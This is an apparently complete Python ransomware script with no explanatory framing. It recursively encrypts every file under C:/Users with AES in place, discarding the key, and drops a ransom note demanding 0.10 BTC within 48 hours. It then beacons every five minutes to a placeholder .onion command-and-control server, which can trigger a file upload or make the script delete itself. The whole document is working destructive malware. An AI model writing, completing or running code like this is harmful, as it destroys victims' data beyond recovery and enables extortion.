from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os
import socket
import hashlib
import requests
import time

# Encryption core (snipped for brevity)
hostname = socket.gethostname().encode()
salt = hashlib.sha256(hostname).digest()[:16]
base_key = get_random_bytes(16)
key = hashlib.sha256(base_key + salt).digest()[:32]
cipher = AES.new(key, AES.MODE_EAX)

for root, dirs, files in os.walk("C:/Users"):
    for file in files:
        filepath = os.path.join(root, file)
        with open(filepath,"rb") as f:
            data = f.read()
        ciphertext, tag = cipher.encrypt_and_digest(data)
        with open(filepath,"wb") as f:
            f.write(ciphertext)

# Ransom note
ransom_note = """
YOUR FILES ARE ENCRYPTED. SEND 0.10 BTC (7300 EURO) to [BTC_ADDRESS] in 48 hours or it's gone. 
- Res Gestae
"""
with open("C:/Users/Public/RANSOM.txt","w") as f:
    f.write(ransom_note)

# C2 comms
c2_url = "http://your-darkweb-server.onion/status"
machine_id = hashlib.sha256(hostname).hexdigest()

while True:
    try:
        payload = {"id": machine_id, "status": "active"}
        response = requests.post(c2_url, json=payload, timeout=5)
        if response.status_code == 200:
            commands = response.json().get("commands", [])
            if "exfil" in commands:
                with open("C:/Users/Public/RANSOM.txt","rb") as f:
                    requests.post(f"{c2_url}/upload", files={"file": f})
            elif "kill" in commands:
                os.remove(__file__)  # Self-destruct
                break
    except:
        pass
    time.sleep(300)  # Check in every 5 minutes
